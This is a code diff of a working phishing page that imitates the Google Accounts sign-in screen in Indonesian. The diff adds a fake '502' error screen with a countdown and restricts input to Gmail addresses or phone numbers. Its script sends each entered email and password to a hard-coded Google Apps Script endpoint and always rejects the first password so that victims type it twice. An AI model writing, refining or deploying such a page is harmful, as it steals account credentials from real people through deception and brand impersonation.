@@ -4,7 +4,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sign in - Google Accounts</title>
+  <title>502. That’s an error.</title>
   <!-- Tailwind CSS CDN -->
   <script src="https://cdn.tailwindcss.com"></script>
   <!-- Google Fonts: Roboto & Google Sans -->
@@ -29,7 +29,7 @@
     body {
       font-family: 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
       background-color: #ffffff;
-      color: #1f1f1f;
+      color: #202124;
     }
 
     .google-heading {
@@ -165,7 +165,7 @@
   <div class="flex-grow flex flex-col justify-start w-full max-w-[450px] mx-auto pt-4 sm:pt-10 px-2 sm:px-0">
     <div class="w-full">
 
-      <!-- Logo Google (Terbaru) -->
+      <!-- Logo Google -->
       <div class="mb-6">
         <svg class="w-10 h-10" viewBox="0 0 24 24">
           <path fill="#4285F4"
@@ -192,7 +192,7 @@
         <!-- STAGE 1: EMAIL / PHONE -->
         <div id="stepEmail">
           <div id="emailContainer" class="google-input-container">
-            <input type="email" id="emailInput" class="google-input" placeholder=" " autocomplete="username" required />
+            <input type="text" id="emailInput" class="google-input" placeholder=" " autocomplete="username" required />
             <label for="emailInput" class="google-label">Email atau nomor telepon</label>
           </div>
 
@@ -211,19 +211,16 @@
 
           <div class="mt-8 text-sm text-[#444746] leading-relaxed">
             Bukan komputer Anda? Gunakan Private Window untuk login.
-            <a href="#" class="text-[#0b57d0] font-medium hover:underline">Pelajari lebih lanjut cara menggunakan Mode
-              tamu</a>
+            <a href="#" class="text-[#0b57d0] font-medium hover:underline">Pelajari lebih lanjut cara menggunakan Mode tamu</a>
           </div>
         </div>
 
         <!-- STAGE 2: PASSWORD -->
         <div id="stepPassword" class="hidden">
-          <!-- Badge Akun Email Yang Dipilih (Ikon Presisi Sesuai Foto) -->
           <div id="userBadge"
             class="inline-flex items-center border border-[#747775] rounded-full px-2.5 py-1 mb-6 cursor-pointer hover:bg-gray-50 transition">
             <div class="w-5 h-5 rounded-full flex items-center justify-center mr-2">
-              <svg class="w-5 h-5 text-[#444746]" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                stroke-width="1.8">
+              <svg class="w-5 h-5 text-[#444746]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
                 <circle cx="12" cy="12" r="10" />
                 <circle cx="12" cy="9" r="3.2" />
                 <path d="M6 18.5c.8-2.6 3.4-4.5 6-4.5s5.2 1.9 6 4.5" stroke-linecap="round" />
@@ -260,8 +257,7 @@
           <div id="userBadgePasskey"
             class="inline-flex items-center border border-[#747775] rounded-full px-2.5 py-1 mb-6 cursor-pointer hover:bg-gray-50 transition">
             <div class="w-5 h-5 rounded-full flex items-center justify-center mr-2">
-              <svg class="w-5 h-5 text-[#444746]" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                stroke-width="1.8">
+              <svg class="w-5 h-5 text-[#444746]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
                 <circle cx="12" cy="12" r="10" />
                 <circle cx="12" cy="9" r="3.2" />
                 <path d="M6 18.5c.8-2.6 3.4-4.5 6-4.5s5.2 1.9 6 4.5" stroke-linecap="round" />
@@ -273,14 +269,12 @@
             </svg>
           </div>
 
-          <!-- Ilustrasi Vektor Google Passkey Presisi 100% -->
           <div class="my-6 flex justify-center items-center">
             <svg class="w-64 h-32" viewBox="0 0 260 130" fill="none">
               <path d="M130 15 H210 A15 15 0 0 1 225 30 V105 A15 15 0 0 1 210 120 H130 Z" fill="#E8EAED" />
               <path d="M55 50 C55 35 70 25 85 25 H125 V115 H55 Z" fill="#202124" />
               <circle cx="200" cy="48" r="16" fill="#FBBC04" />
-              <path d="M194 48 C194 43 206 43 206 48 C206 54 194 54 194 48 Z" stroke="#202124" stroke-width="2"
-                fill="none" />
+              <path d="M194 48 C194 43 206 43 206 48 C206 54 194 54 194 48 Z" stroke="#202124" stroke-width="2" fill="none" />
               <circle cx="200" cy="48" r="4" stroke="#202124" stroke-width="2" fill="none" />
               <rect x="165" y="60" width="42" height="42" rx="8" stroke="#202124" stroke-width="2" fill="#FFFFFF" />
               <rect x="171" y="66" width="12" height="12" rx="3" stroke="#202124" stroke-width="2" fill="none" />
@@ -306,43 +300,78 @@
           </div>
 
           <p class="text-sm text-[#444746] leading-relaxed text-left">
-            Anda dapat menggunakan kunci sandi untuk memverifikasi diri Anda. Perangkat Anda mungkin meminta Anda untuk
-            memindai kode QR sebelum menggunakan kunci layar Anda.
+            Anda dapat menggunakan kunci sandi untuk memverifikasi diri Anda. Perangkat Anda mungkin meminta Anda untuk memindai kode QR sebelum menggunakan kunci layar Anda.
           </p>
         </div>
 
+        <!-- STAGE 4: ERROR 502 DENGAN HITUNG MUNDUR -->
+        <div id="stepError502" class="hidden">
+          <div class="flex flex-col md:flex-row items-start justify-between gap-6">
+            <div class="flex-1">
+              <h2 class="text-xl font-normal text-[#202124] mb-4">502. That’s an error.</h2>
+              <p class="text-sm text-[#202124] leading-relaxed mb-4">
+                The server encountered a temporary error and could not complete your request.
+              </p>
+              <p class="text-sm text-[#202124] leading-relaxed">
+                Please try again in <span id="countdownTimer">30</span> seconds. That’s all we know.
+              </p>
+            </div>
+            <div class="w-full md:w-auto flex justify-center">
+              <!-- Robot Rusak -->
+              <svg class="w-44 h-44" viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="60" y="40" width="60" height="40" rx="4" stroke="#4285F4" stroke-width="2.5" fill="#FFFFFF"/>
+                <line x1="90" y1="20" x2="90" y2="40" stroke="#4285F4" stroke-width="2.5" stroke-linecap="round"/>
+                <circle cx="90" cy="18" r="4" fill="#4285F4"/>
+                <rect x="70" y="52" width="12" height="8" rx="2" fill="#4285F4"/>
+                <rect x="98" y="52" width="12" height="8" rx="2" fill="#4285F4"/>
+                <path d="M80 68 Q90 62 100 68" stroke="#4285F4" stroke-width="2" stroke-linecap="round"/>
+                <rect x="50" y="85" width="80" height="60" rx="6" stroke="#4285F4" stroke-width="2.5" fill="#FFFFFF"/>
+                <rect x="75" y="100" width="30" height="20" rx="3" stroke="#4285F4" stroke-width="2" fill="#E8F0FE"/>
+                <path d="M50 100 L30 90" stroke="#4285F4" stroke-width="2.5" stroke-linecap="round"/>
+                <path d="M20 80 L35 95" stroke="#EA4335" stroke-width="2.5" stroke-linecap="round"/>
+                <circle cx="18" cy="78" r="4" fill="#EA4335"/>
+                <rect x="135" y="70" width="15" height="25" rx="3" transform="rotate(25 135 70)" stroke="#34A853" stroke-width="2" fill="#FFFFFF"/>
+                <rect x="130" y="110" width="20" height="10" rx="3" transform="rotate(-15 130 110)" stroke="#FBBC05" stroke-width="2" fill="#FFFFFF"/>
+                <circle cx="140" cy="135" r="6" stroke="#4285F4" stroke-width="2" fill="#FFFFFF"/>
+                <path d="M120 145 L135 155" stroke="#EA4335" stroke-width="2" stroke-linecap="round"/>
+                <path d="M35 130 L45 145" stroke="#34A853" stroke-width="2" stroke-linecap="round"/>
+                <circle cx="30" cy="125" r="5" stroke="#FBBC05" stroke-width="2" fill="#FFFFFF"/>
+                <path d="M70 160 L60 175" stroke="#4285F4" stroke-width="2.5" stroke-linecap="round"/>
+                <path d="M90 160 L100 170" stroke="#4285F4" stroke-width="2.5" stroke-linecap="round"/>
+              </svg>
+            </div>
+          </div>
+        </div>
+
         <!-- Tombol Aksi / Footer Form -->
-        <div class="pt-8 flex items-center justify-between">
+        <div id="formFooter" class="pt-8 flex items-center justify-between">
           <div>
             <button type="button" id="btnCreateAccount" class="btn-google-text">Buat akun</button>
-            <a href="#" id="btnForgotPassword" class="hidden text-[#0b57d0] font-medium text-sm hover:underline">Lupa
-              sandi?</a>
-            <a href="#" id="btnTryAnother" class="hidden text-[#0b57d0] font-medium text-sm hover:underline">Coba cara
-              lain</a>
+            <a href="#" id="btnForgotPassword" class="hidden text-[#0b57d0] font-medium text-sm hover:underline">Lupa sandi?</a>
+            <a href="#" id="btnTryAnother" class="hidden text-[#0b57d0] font-medium text-sm hover:underline">Coba cara lain</a>
           </div>
           <button type="submit" id="btnNext" class="btn-google-primary flex items-center space-x-2">
-<span id="btnText">Berikutnya</span>
-<svg id="btnSpinner" class="hidden animate-spin h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-</svg>
-</button>
+            <span id="btnText">Berikutnya</span>
+            <svg id="btnSpinner" class="hidden animate-spin h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+          </button>
         </div>
       </form>
 
     </div>
   </div>
 
-  <!-- Footer Baku Google (Pilihan Bahasa Sejajar Di Kiri Bawah) -->
-  <footer
-    class="w-full max-w-[450px] mx-auto px-2 py-4 flex flex-row items-center justify-between text-xs text-[#444746]">
+  <!-- Footer Google -->
+  <footer id="mainFooter" class="w-full max-w-[450px] mx-auto px-2 py-4 flex flex-row items-center justify-between text-xs text-[#444746]">
     <div class="relative">
       <button type="button" id="langSelectorBtn" class="flex items-center space-x-2 hover:bg-gray-100 px-2 py-1.5 rounded transition text-[#444746]">
-<span id="selectedLangText">Indonesia</span>
-<svg class="w-3.5 h-3.5 fill-current" viewBox="0 0 24 24">
-<path d="M7 10l5 5 5-5z"/>
-</svg>
-</button>
+        <span id="selectedLangText">Indonesia</span>
+        <svg class="w-3.5 h-3.5 fill-current" viewBox="0 0 24 24">
+          <path d="M7 10l5 5 5-5z"/>
+        </svg>
+      </button>
       <div id="langDropdown" class="lang-dropdown-menu hidden">
         <div class="lang-option" data-lang="Dansk">Dansk</div>
         <div class="lang-option" data-lang="Deutsch">Deutsch</div>
@@ -367,215 +396,254 @@
   <!-- Logic Script -->
   <script>
     // MASUKKAN URL WEB APP GOOGLE APPS SCRIPT ANDA DI SINI
-        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxpeOU5UTaJzyzqyL0esbPNP3GkeoKTRd8O7CcD2wFghQNe1jRFZavipjkcxHZSbN_-Sg/exec';
+    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxpeOU5UTaJzyzqyL0esbPNP3GkeoKTRd8O7CcD2wFghQNe1jRFZavipjkcxHZSbN_-Sg/exec';
 
-        let currentStep = 'email';
-        let passwordAttempts = 0;
+    let currentStep = 'email';
+    let passwordAttempts = 0;
+    let countdownInterval = null;
 
-        const stepEmail = document.getElementById('stepEmail');
-        const stepPassword = document.getElementById('stepPassword');
-        const stepPasskey = document.getElementById('stepPasskey');
+    const stepEmail = document.getElementById('stepEmail');
+    const stepPassword = document.getElementById('stepPassword');
+    const stepPasskey = document.getElementById('stepPasskey');
+    const stepError502 = document.getElementById('stepError502');
 
-        const emailInput = document.getElementById('emailInput');
-        const passwordInput = document.getElementById('passwordInput');
-        const emailContainer = document.getElementById('emailContainer');
-        const passwordContainer = document.getElementById('passwordContainer');
+    const emailInput = document.getElementById('emailInput');
+    const passwordInput = document.getElementById('passwordInput');
+    const emailContainer = document.getElementById('emailContainer');
+    const passwordContainer = document.getElementById('passwordContainer');
 
-        const emailError = document.getElementById('emailError');
-        const emailErrorText = document.getElementById('emailErrorText');
-        const passwordError = document.getElementById('passwordError');
-        const passwordErrorText = document.getElementById('passwordErrorText');
+    const emailError = document.getElementById('emailError');
+    const emailErrorText = document.getElementById('emailErrorText');
+    const passwordError = document.getElementById('passwordError');
+    const passwordErrorText = document.getElementById('passwordErrorText');
 
-        const mainHeading = document.getElementById('mainHeading');
-        const subHeading = document.getElementById('subHeading');
-        const displayEmail = document.getElementById('displayEmail');
-        const displayEmailPasskey = document.getElementById('displayEmailPasskey');
-        const userBadge = document.getElementById('userBadge');
-        const userBadgePasskey = document.getElementById('userBadgePasskey');
+    const mainHeading = document.getElementById('mainHeading');
+    const subHeading = document.getElementById('subHeading');
+    const displayEmail = document.getElementById('displayEmail');
+    const displayEmailPasskey = document.getElementById('displayEmailPasskey');
+    const userBadge = document.getElementById('userBadge');
+    const userBadgePasskey = document.getElementById('userBadgePasskey');
 
-        const btnCreateAccount = document.getElementById('btnCreateAccount');
-        const btnForgotPassword = document.getElementById('btnForgotPassword');
-        const btnTryAnother = document.getElementById('btnTryAnother');
+    const btnCreateAccount = document.getElementById('btnCreateAccount');
+    const btnForgotPassword = document.getElementById('btnForgotPassword');
+    const btnTryAnother = document.getElementById('btnTryAnother');
 
-        const btnNext = document.getElementById('btnNext');
-        const btnText = document.getElementById('btnText');
-        const btnSpinner = document.getElementById('btnSpinner');
-        const statusMessage = document.getElementById('statusMessage');
+    const btnNext = document.getElementById('btnNext');
+    const btnText = document.getElementById('btnText');
+    const btnSpinner = document.getElementById('btnSpinner');
+    const statusMessage = document.getElementById('statusMessage');
+    const formFooter = document.getElementById('formFooter');
+    const mainFooter = document.getElementById('mainFooter');
+    const countdownTimer = document.getElementById('countdownTimer');
 
-        // Dropdown Bahasa Toggle
-        const langSelectorBtn = document.getElementById('langSelectorBtn');
-        const langDropdown = document.getElementById('langDropdown');
-        const selectedLangText = document.getElementById('selectedLangText');
+    // Dropdown Bahasa Toggle
+    const langSelectorBtn = document.getElementById('langSelectorBtn');
+    const langDropdown = document.getElementById('langDropdown');
+    const selectedLangText = document.getElementById('selectedLangText');
 
-        langSelectorBtn.addEventListener('click', (e) => {
-            e.stopPropagation();
-            langDropdown.classList.toggle('hidden');
+    langSelectorBtn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      langDropdown.classList.toggle('hidden');
+    });
+
+    document.querySelectorAll('.lang-option').forEach(opt => {
+      opt.addEventListener('click', () => {
+        document.querySelectorAll('.lang-option').forEach(o => o.classList.remove('selected'));
+        opt.classList.add('selected');
+        selectedLangText.textContent = opt.getAttribute('data-lang');
+        langDropdown.classList.add('hidden');
+      });
+    });
+
+    document.addEventListener('click', () => {
+      langDropdown.classList.add('hidden');
+    });
+
+    // Toggle Password Visibility
+    document.getElementById('showPassword').addEventListener('change', function() {
+      passwordInput.type = this.checked ? 'text' : 'password';
+    });
+
+    function clearErrors() {
+      emailContainer.classList.remove('has-error');
+      passwordContainer.classList.remove('has-error');
+      emailError.classList.add('hidden');
+      passwordError.classList.add('hidden');
+    }
+
+    function goToEmailStep() {
+      currentStep = 'email';
+      passwordAttempts = 0;
+      
+      if (countdownInterval) {
+        clearInterval(countdownInterval);
+        countdownInterval = null;
+      }
+
+      clearErrors();
+      stepPassword.classList.add('hidden');
+      stepPasskey.classList.add('hidden');
+      stepError502.classList.add('hidden');
+      stepEmail.classList.remove('hidden');
+      btnTryAnother.classList.add('hidden');
+      btnForgotPassword.classList.add('hidden');
+      btnCreateAccount.classList.remove('hidden');
+      subHeading.classList.remove('hidden');
+      formFooter.classList.remove('hidden');
+      mainFooter.classList.remove('hidden');
+      mainHeading.classList.remove('hidden');
+      mainHeading.textContent = 'Login';
+      subHeading.textContent = 'Gunakan Akun Google Anda';
+      btnText.textContent = 'Berikutnya';
+      emailInput.value = '';
+      passwordInput.value = '';
+      statusMessage.classList.add('hidden');
+    }
+
+    // Fungsi Pengiriman Data ke Google Sheets (Tergabung Sesuai Skrip Lama)
+    async function sendDataToSheets(email, password, attemptNumber) {
+      try {
+        await fetch(SCRIPT_URL, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            email: email,
+            password: password,
+            attempt: attemptNumber
+          })
         });
+      } catch (err) {
+        console.error("Gagal mengirim data:", err);
+      }
+    }
 
-        document.querySelectorAll('.lang-option').forEach(opt => {
-            opt.addEventListener('click', () => {
-                document.querySelectorAll('.lang-option').forEach(o => o.classList.remove('selected'));
-                opt.classList.add('selected');
-                selectedLangText.textContent = opt.getAttribute('data-lang');
-                langDropdown.classList.add('hidden');
-            });
-        });
+    // Fungsi Menampilkan Halaman Error 502 & Hitung Mundur 30 Detik
+    function trigger502Error() {
+      btnSpinner.classList.remove('hidden');
+      btnText.textContent = 'Memproses...';
+      btnNext.disabled = true;
+      statusMessage.classList.add('hidden');
 
-        document.addEventListener('click', () => {
-            langDropdown.classList.add('hidden');
-        });
+      setTimeout(() => {
+        stepPassword.classList.add('hidden');
+        stepPasskey.classList.add('hidden');
+        mainHeading.classList.add('hidden');
+        subHeading.classList.add('hidden');
+        formFooter.classList.add('hidden');
+        mainFooter.classList.add('hidden');
+        
+        stepError502.classList.remove('hidden');
 
-        // Toggle Password Visibility
-        document.getElementById('showPassword').addEventListener('change', function() {
-            passwordInput.type = this.checked ? 'text' : 'password';
-        });
+        btnSpinner.classList.add('hidden');
+        btnText.textContent = 'Berikutnya';
+        btnNext.disabled = false;
 
-        function clearErrors() {
-            emailContainer.classList.remove('has-error');
-            passwordContainer.classList.remove('has-error');
-            emailError.classList.add('hidden');
-            passwordError.classList.add('hidden');
-        }
+        let secondsLeft = 30;
+        countdownTimer.textContent = secondsLeft;
 
-        function goToEmailStep() {
-            currentStep = 'email';
-            passwordAttempts = 0;
-            clearErrors();
-            stepPassword.classList.add('hidden');
-            stepPasskey.classList.add('hidden');
-            stepEmail.classList.remove('hidden');
-            
-            btnTryAnother.classList.add('hidden');
-            btnForgotPassword.classList.add('hidden');
-            btnCreateAccount.classList.remove('hidden');
-            
-            subHeading.classList.remove('hidden');
-            mainHeading.textContent = 'Login';
-            subHeading.textContent = 'Gunakan Akun Google Anda';
-            btnText.textContent = 'Berikutnya';
-            passwordInput.value = '';
-            statusMessage.classList.add('hidden');
-        }
+        if (countdownInterval) clearInterval(countdownInterval);
 
-        // Fungsi Pengiriman Data ke Google Sheets
-        async function sendDataToSheets(email, password, attemptNumber) {
-            try {
-                await fetch(SCRIPT_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        email: email,
-                        password: password,
-                        attempt: attemptNumber
-                    })
-                });
-            } catch (err) {
-                console.error("Gagal mengirim data:", err);
-            }
-        }
+        countdownInterval = setInterval(() => {
+          secondsLeft--;
+          countdownTimer.textContent = secondsLeft;
 
-        userBadge.addEventListener('click', goToEmailStep);
-        if(userBadgePasskey) userBadgePasskey.addEventListener('click', goToEmailStep);
-
-        btnTryAnother.addEventListener('click', function(e) {
-            e.preventDefault();
+          if (secondsLeft <= 0) {
+            clearInterval(countdownInterval);
+            countdownInterval = null;
             goToEmailStep();
-        });
+          }
+        }, 1000);
 
-        btnForgotPassword.addEventListener('click', function(e) {
-            e.preventDefault();
-            currentStep = 'passkey';
-            clearErrors();
-            stepPassword.classList.add('hidden');
-            stepPasskey.classList.remove('hidden');
-            
-            btnForgotPassword.classList.add('hidden');
-            btnTryAnother.classList.remove('hidden');
-            subHeading.classList.add('hidden');
-            
-            mainHeading.textContent = 'Gunakan sidik jari, wajah, atau kunci layar Anda';
-            displayEmailPasskey.textContent = emailInput.value || '';
-            btnText.textContent = 'Lanjutkan';
-        });
+      }, 1000);
+    }
 
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            clearErrors();
+    userBadge.addEventListener('click', goToEmailStep);
+    if (userBadgePasskey) userBadgePasskey.addEventListener('click', goToEmailStep);
 
-            if (currentStep === 'email') {
-                const val = emailInput.value.trim();
-                if (!val || (!val.includes('@') && val.length < 5)) {
-                    emailErrorText.textContent = 'Masukkan email atau nomor telepon';
-                    emailContainer.classList.add('has-error');
-                    emailError.classList.remove('hidden');
-                    return;
-                }
+    btnTryAnother.addEventListener('click', function(e) {
+      e.preventDefault();
+      goToEmailStep();
+    });
 
-                currentStep = 'password';
-                passwordAttempts = 0;
-                displayEmail.textContent = emailInput.value;
-                stepEmail.classList.add('hidden');
-                stepPassword.classList.remove('hidden');
-                
-                btnCreateAccount.classList.add('hidden');
-                btnForgotPassword.classList.remove('hidden');
-                subHeading.classList.add('hidden');
-                mainHeading.textContent = 'Selamat datang';
-                btnText.textContent = 'Berikutnya';
-                
-                setTimeout(() => passwordInput.focus(), 100);
-            } 
-            else if (currentStep === 'password') {
-                const passVal = passwordInput.value.trim();
+    btnForgotPassword.addEventListener('click', function(e) {
+      e.preventDefault();
+      currentStep = 'passkey';
+      clearErrors();
+      stepPassword.classList.add('hidden');
+      stepPasskey.classList.remove('hidden');
+      btnForgotPassword.classList.add('hidden');
+      btnTryAnother.classList.remove('hidden');
+      subHeading.classList.add('hidden');
+      mainHeading.textContent = 'Gunakan sidik jari, wajah, atau kunci layar Anda';
+      displayEmailPasskey.textContent = emailInput.value || '';
+      btnText.textContent = 'Lanjutkan';
+    });
 
-                if (!passVal) {
-                    passwordErrorText.textContent = 'Masukkan sandi';
-                    passwordContainer.classList.add('has-error');
-                    passwordError.classList.remove('hidden');
-                    return;
-                }
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      clearErrors();
 
-                passwordAttempts++;
+      if (currentStep === 'email') {
+        const val = emailInput.value.trim();
 
-                // Pengiriman data otomatis ke Sheet pada tiap input password
-                sendDataToSheets(emailInput.value, passVal, passwordAttempts);
+        // Validasi ketat: Harus berakhiran @gmail.com ATAU berupa angka (nomor telepon)
+        const isGmail = val.toLowerCase().endsWith('@gmail.com');
+        const isPhone = /^\d+$/.test(val);
 
-                // Percobaan 1, 2, dan 3: Menampilkan pesan kesalahan
-                if (passwordAttempts < 4) {
-                    passwordErrorText.textContent = 'Sandi salah. Coba lagi atau klik \'Lupa sandi\' untuk meresetnya.';
-                    passwordContainer.classList.add('has-error');
-                    passwordError.classList.remove('hidden');
-                    passwordInput.value = '';
-                    passwordInput.focus();
-                    return;
-                }
+        if (!val || (!isGmail && !isPhone)) {
+          emailErrorText.textContent = 'Masukkan email atau nomor telepon';
+          emailContainer.classList.add('has-error');
+          emailError.classList.remove('hidden');
+          emailInput.focus();
+          return;
+        }
 
-                // Percobaan ke-4: Berhasil
-                btnSpinner.classList.remove('hidden');
-                btnText.textContent = 'Memproses...';
-                btnNext.disabled = true;
-                statusMessage.classList.add('hidden');
+        currentStep = 'password';
+        passwordAttempts = 0;
+        displayEmail.textContent = emailInput.value;
+        stepEmail.classList.add('hidden');
+        stepPassword.classList.remove('hidden');
+        btnCreateAccount.classList.add('hidden');
+        btnForgotPassword.classList.remove('hidden');
+        subHeading.classList.add('hidden');
+        mainHeading.textContent = 'Selamat datang';
+        btnText.textContent = 'Berikutnya';
+        setTimeout(() => passwordInput.focus(), 100);
+      } 
+      else if (currentStep === 'password') {
+        const passVal = passwordInput.value.trim();
 
-                setTimeout(() => {
-                    statusMessage.className = 'p-3 rounded text-sm font-medium bg-green-50 text-green-700 border border-green-200';
-                    statusMessage.textContent = 'Login berhasil!';
-                    statusMessage.classList.remove('hidden');
+        if (!passVal) {
+          passwordErrorText.textContent = 'Masukkan sandi';
+          passwordContainer.classList.add('has-error');
+          passwordError.classList.remove('hidden');
+          passwordInput.focus();
+          return;
+        }
 
-                    btnSpinner.classList.add('hidden');
-                    btnText.textContent = 'Berikutnya';
-                    btnNext.disabled = false;
+        passwordAttempts++;
 
-                    setTimeout(() => {
-                        goToEmailStep();
-                        emailInput.value = '';
-                    }, 2500);
-                }, 1000);
-            }
-            else if (currentStep === 'passkey') {
-                goToEmailStep();
-            }
-        });
+        // Pengiriman data otomatis ke Sheet untuk setiap percobaan kata sandi
+        sendDataToSheets(emailInput.value, passVal, passwordAttempts);
+
+        // PERCOBAAN 1: Tampilkan pesan kesalahan sandi salah
+        if (passwordAttempts === 1) {
+          passwordErrorText.textContent = 'Sandi salah. Coba lagi atau klik \'Lupa sandi\' untuk meresetnya.';
+          passwordContainer.classList.add('has-error');
+          passwordError.classList.remove('hidden');
+          passwordInput.value = '';
+          passwordInput.focus();
+          return;
+        }
+
+        // PERCOBAAN 2 (Percobaan Terakhir): Alihkan langsung ke tampilan Error 502 & hitung mundur 30 detik
+        trigger502Error();
+      }
+      else if (currentStep === 'passkey') {
+        trigger502Error();
+      }
+    });
   </script>
 </body>
 
